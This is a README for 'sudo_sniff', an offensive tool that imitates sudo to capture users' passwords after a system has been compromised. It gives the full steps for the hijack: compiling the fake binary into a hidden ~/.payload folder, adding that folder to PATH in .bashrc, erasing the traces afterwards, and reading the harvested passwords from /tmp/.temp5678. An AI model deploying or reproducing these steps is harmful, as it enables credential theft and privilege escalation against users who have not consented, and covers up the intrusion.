# sudo_sniff
**sudo\_sniff** is a simple program that attempts to steal the user's password while running sudo without arousing any suspicion. The idea is to modify the user's `$PATH` in order to hijack sudo when executed by the user. This could be used in post-exploitation as an alternative route for acheiving root acces (given that the user has the correct permissions).

**sudo_sniff** will store both correct and incorrect password entries at the following location per default: `/tmp/.temp5678`

## Improvements
* ~~Hide the victim's input~~
* ~~Add function to either send the password to attacker or save it on disk.~~
* sudo may be in different locations on different systems, perhaps implement a function to locate it
* ~~[BUG] When the victim enters his input, the text asking for the password will be printed multiple times.~~

## Usage
```
hunter@nsa:~$ git clone git@github.com:mjdubell/sudo_sniff.git
hunter@nsa:~$ cd sudo_sniff/
hunter@nsa:~$ make
hunter@nsa:~$ ./sudo whoami
```

#### Post Exploitation
```
victim@server:~$ mkdir $HOME/.payload
victim@server:~$ gcc -Wall -g -o $HOME/.payload/sudo sudo_sniff.c
victim@server:~$ echo 'export PATH="$HOME/.payload:$PATH"' >> $HOME/.bashrc
```
*Note: Make sure `sudo` is executable.*

##### Cleanup
```
victim@server:~$ rm -rf $HOME/.payload; rm /tmp/.temp5678; sed '/export PATH="$HOME\/\.payload:$PATH"/d' .bashrc > tmp && mv tmp .bashrc
```
*Note: Running `history` will reveal the cleanup command*

##### Retrieve the password
```
victim@server:~$ cat /tmp/.temp5678
victim:mypasword:ERROR
victim:mypassword:SUCCESS
```

## Contributing
1. Fork it!
2. Create your feature branch: `git checkout -b my-new-feature`
3. Commit your changes: `git commit -am 'Add some feature'`
4. Push to the branch: `git push origin my-new-feature`
5. Submit a pull request :D
